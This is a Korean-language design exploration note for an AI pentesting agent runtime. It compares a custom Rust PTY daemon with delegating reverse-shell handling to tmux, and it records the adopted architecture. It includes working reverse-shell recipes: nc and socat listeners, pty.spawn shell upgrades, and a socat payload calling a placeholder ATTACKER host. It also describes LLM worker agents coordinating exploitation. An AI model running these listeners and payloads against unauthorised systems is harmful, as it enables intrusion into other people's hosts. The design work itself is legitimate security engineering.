# 대화형 쉘·PTY·리버스쉘 유지 설계 아이디어

> **결론(2026-09-05):** 이 탐색은 **ADR-0003**(Accepted)으로 수렴했다. 채택된 모델은
> 범용 `tmux` 패스스루 도구 — 기존 `bash` 도구의 일회성 실행 경로를 그대로 재사용하되
> `tmux <args>` 형태로 실행하여, tmux가 PTY·세션 상태·수명주기를 전적으로 소유한다.
> `shell.stdin` 확장, 공용 책상 런타임 관리, 세션 소유 worker RPC 중계는 모두 기각됨.
> 규범 결정과 구현 기록은 `docs/adr/ADR-0003-*.md`가 소유한다. 아래 본문은 그 결정에
> 이른 탐색 기록이다.

---

## 비교 분석: pentesting PTY 데몬 vs minimal-agent tmux 위임

### pentesting Shell Listener에서 부딪힌 구조적 한계

자매 프로젝트 `pentesting`은 리버스쉘/덤프쉘의 PTY 부재 문제를 **Rust 코어에 전용
PTY 데몬을 구축**하는 방식으로 풀었다. `openpty` + `fork` + `dup2`로 PTY를 직접
할당하고, UDS 컨트롤 소켓으로 에이전트가 제어하며, 센티널/프롬프트 파싱으로 출력
경계를 감지한다. 이 접근은 동작하지만, 운용하면서 다음 한계가 드러났다:

1. **과도한 코어 복잡도.** PTY 데몬, UDS JSON-RPC 서버, 4-worker 스레드 풀, 25가지
   ControlOp, FD 예산 시스템, 적응형 업그레이드 상태머신, 센티널 파서, 프롬프트
   감지기, ANSI 정제기를 합치면 **~7,000줄의 unsafe Rust 코드**가 된다. 이 전체가
   코어 바이너리에 내장되어, PTY와 무관한 기능을 수정할 때도 이 코드의 영향을
   고려해야 한다.

2. **경계 표식(sentinel) 파싱의 실전 취약성.** pentesting은 명령의 출력 범위를
   알아내기 위해 명령 앞뒤에 고유 UUID 문자열(경계 표식)을 삽입한다
   (`echo "__START_UUID__"; cmd; echo "__END_UUID__"`). `sentinel.rs`가 이 표식을
   출력에서 찾아 명령 경계를 결정하고, `prompt_detect.rs`가 `$`/`#` 같은 패턴으로
   프롬프트를 감지한다. 그런데 원격 쉘의 echo-back, 서브쉘, curses 출력에 표식이
   섞이면 파싱이 깨진다. **코어 상태머신의 파싱 실패 = 세션 전체가 타임아웃까지
   블로킹**되는 치명적 실패 모드를 갖는다.

3. **`stty raw -echo` 전환을 소프트웨어로 보상하는 근본 한계.** 리버스쉘 업그레이드의
   진짜 문제는 로컬 리스너 끝에 PTY가 없다는 것이다. pentesting은 이를 적응형
   자동화(python3 → python → python2 → script → expect 5-기법 순차 시도 + probe
   검증)로 보상하는데, 이것은 **원인을 제거하지 않고 증상을 소프트웨어로 감싸는
   구조**다. 기법이 모두 실패하면 결국 수동 개입이 필요하다.

4. **터미널 에뮬레이터 재구현의 불완전성.** `terminal.rs`의 ANSI 이스케이프 파싱은
   기본적인 제어 시퀀스만 처리한다. `vim`, `top`, `htop` 같은 full-screen 앱의 출력은
   정확히 해석하지 못한다. 이것은 본질적으로 tmux/xterm 수준의 터미널 에뮬레이터를
   부분적으로 재구현하는 작업이며, 완전한 구현은 비현실적이다.

5. **플랫폼 종속.** `openpty`, `fork`, `setsid`, `TIOCSCTTY`, `dup2` 등 POSIX 전용
   syscall에 의존하여 `#[cfg(unix)]` 분기가 수십 곳에 산재한다. Windows 호스트에서
   에이전트를 직접 돌리는 경로는 사실상 사용 불가.

6. **도구 표면의 토큰 비용.** `shell` + `process`(8개 op) + `session_control`(25개
   op) = **34가지 오퍼레이션의 스키마가 매 턴 컨텍스트에 주입**되어 턴당
   3,000~6,000 토큰을 소비한다.

### 해법 구성: 무엇으로 풀었는가

두 프로젝트는 같은 문제를 완전히 다른 부품으로 풀었다. pentesting은 **전용 Rust
코드**로, minimal-agent는 **OS 도구 + 프롬프트**로.

| 부품 | pentesting | minimal-agent |
|------|-----------|---------------|
| **PTY 할당·IO** | `local_pty.rs` — `openpty`+`fork`+`dup2` (200줄) | tmux `new-session` (OS가 내부에서 동일 syscall 호출) |
| **세션 제어 IPC** | `control_socket.rs` — UDS + JSON-line + 4-worker (760줄) | `bash -lc "tmux <args>"` — 기존 쉘 경로 재사용 |
| **터미널 에뮬레이션** | `terminal.rs` — ANSI 파싱 직접 구현 (236줄, 불완전) | tmux 내장 터미널 에뮬레이터 (xterm 호환, 30년 검증) |
| **덤프쉘 업그레이드** | `adaptive_upgrade.rs` — 5-기법 상태머신 (720줄) | 스킬 카드 `07-reverse-shells.md` — LLM에 절차 가이드 (31줄) |
| **업그레이드 검증** | `probe.rs` — tty/rows/cols 기계적 확인 (207줄) | LLM이 `capture-pane` 출력을 보고 판단 |
| **출력 경계 감지** | `sentinel.rs`+`prompt_detect.rs` — UUID 경계 표식+프롬프트 휴리스틱 | 스킬 doctrine — LLM이 표식 echo 또는 이중 캡처 diff로 판단 |
| **세션 수명주기** | `session.rs`+`fd_budget.rs` — 상태머신+RAII 가드+GC (1,500줄+) | tmux `kill-session` + doctrine "끝나면 정리해라" |
| **비밀 보호** | `secret_ref` — 스트림 레벨 자동 리댁션 | 없음 |
| **감사 추적** | transcript + command ledger + evidence manifest 자동 생성 | 없음 (`pipe-pane` 로그 수동 설정) |
| **합계** | **~7,000줄 Rust** (unsafe syscall 포함) | **Rust 10줄 + 프롬프트 36줄** |

### 커버리지: 해결한 것과 하지 못한 것

| 문제 영역 | pentesting | minimal-agent | 비고 |
|----------|:---------:|:------------:|------|
| PTY 할당 | ✅ 해결 | ✅ 해결 | 동일한 결과. 구현 위치만 다름 (Rust vs tmux) |
| 덤프쉘 → PTY 업그레이드 | ✅ 해결 | ✅ 해결 | pentesting=코드 자동화, minimal-agent=LLM+스킬 카드 |
| `stty raw -echo` 전환 제거 | ⚠️ 보상 | ✅ 근본 해결 | pentesting은 원인을 남기고 소프트웨어로 보상. minimal-agent는 tmux pane이 로컬 PTY이므로 원인 자체 제거 |
| 터미널 에뮬레이션 (full-screen 앱) | ⚠️ 불완전 | ✅ 해결 | pentesting의 ANSI 파싱은 vim/top 미지원. tmux는 완벽 |
| 출력 경계 감지 | ⚠️ 취약 | ⚠️ 취약 | pentesting=센티널 파싱 실패 시 블로킹. minimal-agent=LLM 오판 시 턴 낭비. 둘 다 완벽하지 않음 |
| 업그레이드 성공 검증 | ✅ 기계적 확인 | ⚠️ LLM 판단 | pentesting은 `probe.rs`가 코드로 확정. minimal-agent는 LLM이 추측 — 오판 위험 |
| 비밀 유출 방지 | ✅ 해결 | ❌ 미해결 | minimal-agent는 `send-keys`로 보낸 비밀이 tmux 스크롤백에 평문으로 남음 |
| 감사 추적·증거 보존 | ✅ 해결 | ❌ 미해결 | minimal-agent는 프레임워크 수준 자동 기록 없음 |
| FD 고갈 방지 | ✅ 해결 | ❌ 미해결 | minimal-agent는 tmux 세션 무한 생성 가능, 상한 없음 |
| 고아 세션 자동 정리 | ✅ 해결 | ❌ 미해결 | minimal-agent는 에이전트 비정상 종료 시 tmux 세션 잔류 |
| 토큰 효율 | ❌ 비효율 | ✅ 해결 | pentesting은 34개 op 스키마가 턴당 3,000~6,000 토큰 소비 |
| 유지보수 비용 | ❌ 높음 | ✅ 낮음 | 7,000줄 unsafe Rust vs 10줄 safe Rust |
| tmux 없는 환경 | ✅ 동작 | ❌ 불가 | minimal-agent는 base 이미지에 tmux 필수 |

**요약:** pentesting은 **정책 계층(보안·감사·리소스 관리)은 해결했지만 인프라를
과잉 구현**했다. minimal-agent는 **인프라를 OS에 위임하여 극단적으로 단순화했지만
정책 계층은 미구현이거나 LLM 판단에 의존**한다. 두 프로젝트 모두 출력 경계 감지는
완벽하게 풀지 못했다.

### 같은 문제, 다른 철학: 문제별 비교

#### ① PTY 할당 — 누가 터미널을 소유하는가

- **pentesting — 코어가 직접 소유.** `libc::openpty`로 master/slave FD 쌍을 생성하고,
  `fork` 후 자식에서 `dup2(slave → 0,1,2)`로 IO를 고정. 부모는 master FD를
  `SessionActor`에 넘겨 읽기/쓰기를 직접 관리한다.
- **minimal-agent — OS 도구에 위임.** `tmux new-session -d -s rev '...'`으로 tmux가
  PTY를 할당·소유. 코어는 `bash -lc "tmux <args>"`를 실행할 뿐이다.
- **트레이드오프:** pentesting은 tmux 없이 동작하고 FD 수준의 정밀 제어(예산, RAII
  가드, 연결 쉐딩)가 가능하지만, ~7,000줄의 unsafe Rust syscall 코드를 유지보수해야
  한다. minimal-agent는 코어 ~30줄로 끝나지만 tmux가 base 이미지에 반드시 있어야 한다.

#### ② 덤프쉘 → PTY 업그레이드 — `stty raw -echo` 문제를 어떻게 해결하는가

- **pentesting — 소프트웨어 보상.** 로컬 리스너 끝에 PTY가 없다는 근본 원인은
  그대로 두고, `adaptive_upgrade.rs`의 상태머신이 python3 → python → python2 →
  script → expect 5-기법을 순차 시도한다. 각 시도마다 `probe.rs`가 tty/rows/cols를
  기계적으로 검증하여 `PtyState::Verified`를 확인한다.
- **minimal-agent — 구조적 제거.** 리스너를 tmux pane 안에서 실행하면 로컬 끝이
  이미 PTY다. `stty raw -echo` 전환 절차 자체가 필요 없어진다. 원격에
  `pty.spawn` + `stty rows/cols`만 보내면 끝.
- **트레이드오프:** pentesting은 업그레이드 성공/실패를 코드가 기계적으로 판정하므로
  확실하지만, 5-기법이 모두 실패하면 수동 개입이 필요하고 상태머신 자체가 720줄의
  복잡한 코드다. minimal-agent는 문제의 원인을 제거하므로 단순하지만, 업그레이드
  검증을 LLM이 `capture-pane` 출력을 보고 판단해야 하므로 오판 위험이 있다.

#### ③ 출력 경계 감지 — 명령이 끝났는지 어떻게 아는가

- **pentesting — 코어 상태머신.** `sentinel.rs`가 명령 앞뒤에 고유 UUID 경계
  표식을 삽입하고(`echo "__START__"; cmd; echo "__END__"`), `prompt_detect.rs`가
  `$`/`#`/`(gdb)` 패턴으로 프롬프트를 감지한다. 코어가 출력 스트림을 실시간
  파싱하여 명령 완료를 결정.
- **minimal-agent — 모델 턴에서 판단.** 표식(`echo "__RDY_$RANDOM__"`)이나 이중
  캡처 diff를 모델이 직접 수행. 코어는 파싱하지 않는다.
- **트레이드오프:** pentesting은 자동화 수준이 높지만, 경계 표식이 echo-back/서브쉘/
  curses에 섞이면 파싱이 깨져 세션이 타임아웃까지 블로킹되는 치명적 실패 모드가
  있다. minimal-agent는 파싱 실패 자체가 존재하지 않지만(코어가 파싱을 안 하므로),
  모델이 매 턴 판단해야 하므로 턴 소비가 늘 수 있다.

#### ④ 터미널 출력 해석 — ANSI 이스케이프를 어떻게 처리하는가

- **pentesting — 직접 구현.** `terminal.rs`에서 이스케이프 시퀀스를 파싱하고
  `sanitize_terminal_text`로 정제. 기본적인 제어 시퀀스는 처리하지만 full-screen
  앱(vim, top, htop)의 출력은 정확히 해석하지 못한다.
- **minimal-agent — tmux 엔진에 위임.** `capture-pane -p`가 tmux의 터미널
  에뮬레이터가 해석한 깨끗한 텍스트를 반환한다. 코어에 ANSI 파싱 코드가 없다.
- **트레이드오프:** pentesting은 tmux 없이 동작하지만 터미널 에뮬레이터를 부분적으로
  재구현하는 한계를 가진다. minimal-agent는 tmux의 30년 검증된 엔진을 그대로
  사용하므로 full-screen 앱도 완벽하지만, tmux 의존이 전제.

#### ⑤ 에이전트 ↔ 세션 IPC — 에이전트가 세션을 어떻게 제어하는가

- **pentesting — 전용 UDS 컨트롤 플레인.** 자체 구축한 Unix Domain Socket 서버에
  JSON-line 프로토콜로 25가지 `ControlOp`을 보낸다. 4-worker 스레드 풀, 요청
  크기 제한(1 MB), audit 로깅까지 포함.
- **minimal-agent — 기존 쉘 경로 재사용.** `bash -lc "tmux send-keys -t rev 'id'
  Enter"`처럼 일반 쉘 실행과 동일한 경로. 별도 IPC가 없다.
- **트레이드오프:** pentesting은 세션별 세밀한 제어(attach/detach, transcript
  replay, fdstat, lifecycle 조회)가 가능하지만, 이 IPC 레이어 자체가 수백 줄의
  코드이며 34가지 오퍼레이션 스키마가 매 턴 3,000~6,000 토큰을 소비한다.
  minimal-agent는 2개 도구(수백 토큰)로 끝나지만, 세션 메타데이터 조회나 구조화된
  transcript 같은 고급 기능은 없다.

#### ⑥ 보안 — 비밀이 로그에 남는가

- **pentesting — 스트림 레벨 자동 리댁션.** `secret_ref` 핸들을 통해 에이전트가
  비밀을 주입하면, raw log/transcript/replay에 기록되기 전에 자동으로 마스킹된다.
- **minimal-agent — 보호 없음.** `tmux send-keys`로 비밀을 보내면 tmux 스크롤백과
  `pipe-pane` 로그에 평문으로 남는다.
- **트레이드오프:** 엔터프라이즈 감사 요건이 있으면 pentesting의 리댁션이 필수적.
  CTF/연구 환경에서는 minimal-agent의 단순성이 더 실용적일 수 있다.

#### ⑦ 세션 수명주기 — 정리와 복구

- **pentesting — 코드 레벨 관리.** `revoke`로 강제 종료 + FD 회수, `archive`로
  세션 스냅샷 보존, `GC`로 로그 정리. `ChildSetupGuard`가 설정 실패 시 자식
  프로세스를 자동 정리.
- **minimal-agent — OS 프로세스 수명주기.** `tmux kill-session -t rev`로 정리.
  에이전트 비정상 종료 시 tmux 세션은 잔류하며, 재시작 후 `tmux ls`로 재발견.
- **트레이드오프:** pentesting은 좀비/고아 프로세스 방지가 코드로 보장되지만 그만큼
  복잡하다. minimal-agent는 단순하지만 고아 세션이 남을 수 있고, "내 세션" 매핑이
  소실되어 수동 재발견이 필요하다.

---

본 문서는 규범(ADR)이 아니라 **설계 탐색 노트**다. ADR-0003이 "Proposed"로 남겼던 핵심
고민 — *덤프쉘 업그레이드, 리버스쉘 유지, PTY 관리를 코어를 키우지 않고 어떻게 하는가*
— 를 더 깊이 파고, 이 런타임만의 특징인 **에이전트 간 실시간 통신**을 축으로 구체적
레시피와 선택지를 정리한다.

---

## 1. 문제의 본질: 덤프쉘은 왜 "덤프"인가

`nc`로 받은 리버스쉘이 불편한 이유는 하나다 — **제어 tty(controlling terminal)가
없다.** tty가 없으면:

- job control 없음 → `Ctrl-Z`/`fg`/`bg` 불가, `Ctrl-C`가 쉘 자체를 죽임
- line-buffered/echo 제어 불가 → 화살표·탭 완성·히스토리 없음
- `sudo`, `su`, `ssh`가 "must be run from a terminal"로 거부됨
- `vim`, `less`, `top`, `gdb` 같은 full-screen(curses) 프로그램이 깨짐
- 프롬프트가 안 보이고 출력이 뭉침

전통적 "full TTY 업그레이드" 절차는 이 tty를 사후에 붙이는 과정이다:

```bash
# 1) 원격(피해 호스트)에서 pty를 스폰
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 2) 로컬(공격 호스트)에서 쉘을 백그라운드로
Ctrl-Z
# 3) 로컬 터미널을 raw+no-echo로 바꾸고 다시 포그라운드
stty raw -echo; fg
# 4) 원격에서 터미널 종류/크기 정합
export TERM=xterm-256color; stty rows 50 cols 200
```

3번(`stty raw -echo`)이 문제의 핵심이다. **로컬의 `nc`에는 pty가 없어서, 로컬
터미널을 직접 raw 모드로 돌려 원격 pty와 짝을 맞춰야** 한다. 이 단계는:

- 사람이 대화형 터미널을 쥐고 있다는 전제 위에서만 동작한다,
- `Ctrl-Z` → `stty` → `fg`라는 순차 job-control 조작을 요구한다,
- LLM처럼 **이산 턴(turn)으로 도구를 호출하는** 주체에게는 표현하기 어렵다.

---

## 2. 핵심 통찰: 리스너를 tmux pane 안에서 돌리면 stty raw 전환이 불필요해진다

`stty raw -echo`가 필요한 유일한 이유는 **로컬 리스너가 "덤프 끝"이기 때문**이다.
리스너를 tmux pane 안에서 띄우면, **로컬 끝은 이미 실제 pty(=tmux pane)**다. 그러면
로컬 raw 조작 없이 원격 pty만 붙이면 된다:

```bash
# 에이전트 컨테이너(Linux)에서: 리스너를 tmux pane 안에 띄운다 → 로컬 pty 확보
tmux new-session -d -s rev 'stty -echo; nc -lvnp 4444'

# 쉘이 붙은 뒤, 키 입력으로 원격에 pty를 스폰
tmux send-keys -t rev 'python3 -c "import pty;pty.spawn(\"/bin/bash\")"' Enter
tmux send-keys -t rev 'export TERM=xterm-256color; stty rows 50 cols 200' Enter

# 화면을 깨끗한 텍스트로 읽는다 (LLM의 "관찰")
tmux capture-pane -p -t rev
```

`Ctrl-Z`/`stty raw`/`fg`의 3단계 순차 조작이 **전부 제거**된다. 결과적으로:

- **쓰기(write)** = `tmux send-keys` (한 번의 이산 도구 호출)
- **읽기(read)** = `tmux capture-pane -p` (한 번의 이산 도구 호출)
- job control·raw 모드·echo·창 크기 = **tmux가 처리**, 코어는 무관

이 매핑이 LLM 턴 모델과 정확히 일치한다. tmux는 이 런타임이 재구현하기를 거부한
"가상 터미널 에뮬레이터"를 **이미 검증된 형태로 제공하는 외부 프로세스**다.

> **Windows 대상은?** 리스너는 항상 에이전트 자신의 Linux 컨테이너에서 돈다(런타임
> base는 Linux). 대상 OS가 Windows여도 pty를 붙이는 쪽은 에이전트 컨테이너이므로
> tmux는 항상 가용하다.

---

## 3. 재프레이밍: "세션 = 에이전트가 소유한 액터"

이 런타임의 차별점은 **에이전트끼리 실시간으로 직접 통신**한다는 것이다(ADR-0001 §6).
이 특징을 PTY 문제에 그대로 얹으면 별도 IPC 데몬이 통째로 불필요해진다.

```text
              team send (request)
 worker-A  ───────────────────────▶  worker-shell (세션 소유자)
 (익스플로잇)                          │  tmux new -s tgt ...
 worker-B  ───────────────────────▶  │  send-keys / capture-pane
 (후속 열거)                          │
              team send (insight)     ▼
 main     ◀───────────────────────  "쉘 안정화됨, uid=0, TERM=xterm"
```

- **한 대화형 세션 = 한 named tmux 세션 = 한 worker가 소유**. 소유권이 곧 격리.
- 다른 worker는 `team send`로 요청하거나, tmux 세션에서 직접 `capture-pane`으로 읽음.
- 쉘이 죽으면 소유 worker가 `Insight`로 broadcast. main이 재전략을 수립.
- 장기 리스너/스캔이 main 턴 루프를 막지 않음(2-depth worker 격리).

**"PTY 데몬"을 만드는 대신, worker 하나를 PTY 데몬으로 쓴다.** 수명주기·취소·정리는
코어의 agent lifecycle(recall, terminal, kill-on-drop)에 얹힌다.

---

## 4. 구체 레시피

모든 레시피는 `tmux` 도구 호출로 동작하며, 코어 변경 없이 구현된다.

### 4.1 리버스쉘 리스너 + 자동 업그레이드 + 자동 재대기

```bash
# 죽어도 다시 듣는 리스너를 pane에 상주
tmux new-session -d -s rev \
  'while true; do stty -echo; nc -lvnp 4444; echo "[*] dropped, relistening"; sleep 1; done'

# (쉘 접속 후) 원격 pty 스폰 + 터미널 정합
tmux send-keys -t rev \
  'python3 -c "import pty;pty.spawn(\"/bin/bash\")" || script -qc /bin/bash /dev/null' Enter
tmux send-keys -t rev 'export TERM=xterm-256color; stty rows 50 cols 200' Enter

# 관찰
tmux capture-pane -p -t rev | tail -n 40
```

`socat`이 대상에 있으면 한 방에 완전한 pty를 넘길 수 있다:

```bash
# 리스너(에이전트 측, pane 안)
tmux new -d -s rev 'socat file:$(tty),raw,echo=0 tcp-listen:4444'
# 대상 측 페이로드
# socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444
```

### 4.2 증분 읽기

`capture-pane`은 매번 전체 스크롤백 → 토큰 낭비. `pipe-pane`으로 **증분만** 읽는다:

```bash
tmux pipe-pane -t rev -o 'cat >> /work/rev.log'   # pane → 파일로 tee
# 이후 매 턴: 마지막 오프셋 이후만
tail -c +"$LAST_OFFSET" /work/rev.log
```

### 4.3 출력 정착 판정 (코어가 아닌 모델 턴에서)

```bash
# 방법 1: 유니크 마커
tmux send-keys -t rev 'id; echo "__RDY_$RANDOM__"' Enter
# 다음 턴에 capture-pane에서 __RDY_ 토큰을 모델이 확인

# 방법 2: 이중 캡처 diff — 차이 없으면 "정착"
```

센티널의 취약성은 **코어 상태머신이 아닌 모델의 한 턴 판단**으로 옮겨져, 실패해도
다음 probe로 자연히 회복된다.

### 4.4 비대화형 우선 원칙

pty가 필요 없으면 쓰지 않는다:

```bash
sudo -S id                          # stdin 파이프로 비밀번호
ssh -tt user@host 'id; whoami'      # -tt 강제 pty, 명령 인라인
printf 'A\nB\n' | ./vuln            # 사전 구성 입력 일괄 전송
python3 - <<'PY'                    # REPL 대신 원샷 인라인
import socket; ...
PY
```

복잡한 익스플로잇은 `pwntools`/`pexpect` 스크립트로 원샷 실행 → 워크스페이스에
아티팩트로 보존(재현성 확보).

---

## 5. 선택지 비교

| 접근 | PTY | 상태 유지 | 코어 변경 | 강점 | 약점 |
|------|-----|----------|----------|------|------|
| 일회성 `bash` | ✗ | 무 | 0 | 결정론·완전 격리 | 대화형 불가 |
| **범용 `tmux` (채택)** | ✓ | 유 | ~30줄 패스스루 | 완전 pty·캡처·증분·persistence | tmux 의존(base에 포함) |
| pwntools / pexpect | ✓(내장) | 스크립트 수명 | 0 | 익스플로잇·핸드셰이크 | 상주 세션 부적합 |
| FIFO 파이프 | ✗ | 유(파일) | 0 | 순수 POSIX | pty 아님 |
| dtach / abduco | ✓ | 유 | 0 | 경량 | 캡처 자작 필요 |
| PTY 데몬+UDS (기각) | ✓ | 유 | 수천 줄 | 정밀 제어 | §2.1의 모든 실패 모드 |

**채택된 우선순위:** (1) 비대화형으로 끝낼 수 있으면 `bash`, (2) 상주 대화형/리버스쉘은
`tmux`, (3) 익스플로잇·프로토콜은 pwntools/pexpect 스크립트.

---

## 6. 구현 결과 (2026-09-05 기준)

탐색 당시의 제안과 실제 구현의 대응:

| 탐색 제안 | 구현 결과 |
|----------|----------|
| `shell.stdin` 옵션 필드 추가 | **기각.** 지속 세션/REPL/리스너를 표현 못함. |
| tmux 레시피를 doctrine으로 가이드 | **채택.** `tmux` 도구 정식 추가 (`crates/ma-runtime/src/tools.rs`). |
| base 이미지에 tmux+socat 포함 | **완료.** `docker/runtime-base.Dockerfile` l.69, l.73. |
| 세션 소유 worker + 형제 RPC 중계 | **기각.** 4 KiB 메시지 경계에서 화면 잘림. 각자 직접 읽기. |
| ADR-0003 Proposed → Accepted 승격 | **완료.** 2026-09-05 갱신, Status: Accepted. |

---

## 7. ADR 불변식 정합 확인

- **별도 IPC 데몬 금지 (§4.1):** tmux = OS 프로세스, 자체 데몬 아님 → 지킴.
- **코어 센티널/프롬프트 파싱 금지 (§4.2):** 마커/diff 판정을 모델 턴으로 이동 → 지킴.
- **코어 터미널 에뮬레이터 재구현 금지 (§4.3):** `capture-pane`에 위임 → 지킴.
- **전역 세션 오염 금지 (§4.4):** named 세션 + run-id 네임스페이스 → 지킴.
- **최소 코어 (ADR-0001 §3):** 코어 변경은 `tmux` 패스스루 ~30줄 → 지킴.
- **운영 경계 (ADR-0002 §3.1):** 지속성/리스너는 scope 내 최소 → 지킴.

---

## 8. 열린 질문 / 리스크

1. **캡처 상한과 full-screen 앱.** curses 출력을 `capture-pane -p`로 읽으면 대개
   충분하나, 대형 TUI는 모델이 `q`로 빠져나오도록 doctrine에 명시 필요.
2. **동시성.** 여러 에이전트가 같은 tmux 세션에 동시 쓰기하면 스트림 오염. 세션당
   한 기록자, 직렬화를 doctrine으로 고정.
3. **재시작 후 세션 재발견.** tmux 서버는 에이전트와 독립 → pane은 살지만 "내 것"
   매핑 소실. 재개 시 `tmux ls`로 재발견(코어 상태 저장 안 함).
4. **고아 세션 정리.** worker 비정상 종료 시 tmux 세션 잔류. run 종료 경로에
   `tmux kill-server` doctrine 추가.
5. **네트워크 토폴로지.** 리스너는 에이전트 컨테이너 포트를 열므로, 대상이 에이전트로
   돌아올 수 있는 네트워크 경로가 전제.

---

## 참고자료

- [Upgrading Simple Shells to Fully Interactive TTYs — ropnop blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
- [Upgrade Simple Shells to Fully Interactive TTYs — 0xffsec Handbook](https://0xffsec.com/handbook/shells/full-tty/)
- [Upgrade a linux reverse shell to a fully usable TTY shell — Hacker's Rest](https://zweilosec.github.io/posts/upgrade-linux-shell/)
- [abduco — session detach/attach 도구](https://github.com/martanne/abduco)
- [Terminal session management and multiplexing (tmux/dtach/abduco 비교)](https://danmackinlay.name/notebook/terminal_session_management.html)
